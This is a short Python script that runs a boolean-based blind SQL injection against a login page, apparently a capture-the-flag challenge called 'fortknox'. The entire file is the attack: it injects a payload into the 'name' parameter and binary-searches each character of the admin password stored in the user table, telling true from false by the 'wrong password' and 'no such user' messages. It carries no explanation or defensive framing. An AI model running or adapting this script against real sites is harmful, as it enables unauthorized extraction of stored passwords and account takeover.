from pyTool import *


url = r"http://www.adum.com/fortknox/index.php?"
success_msg = "wrong password"
fail_msg = "no such user"
sl = len(success_msg)
fl = len(fail_msg)
payload = "admin' and ord(substr((select password from user where name = 'admin'),{},1))>={} #"
word_sieve = [x for x in range(32, 128)]
print(word_sieve)
ans_len = 15

ans = "grtP"
for bit in range(len(ans) + 1, ans_len + 1):
    l = 0
    r = len(word_sieve) - 1
    while l < r:
        mid = (l + r + 1) >> 1
        suffix = payload.format(bit, word_sieve[mid])
        url_ = url + urllib.parse.urlencode({'name': suffix, 'password': '1'})
        # print(url_)
        res = open_page(url=url_)
        k = res.find(success_msg)
        if k != -1:
            l = mid
            print("Succeed", [l, r])
        else:
            k = res.find(fail_msg)
            if k != -1:
                r = mid - 1
                print("Failure", [l, r])
            else:
                print("Found nothing.")
    if l == r:
        ans += chr(word_sieve[l])
    else:
        ans += '?'
    print("#%d   ans: %s\n" % (bit, ans))
print("The result is", ans)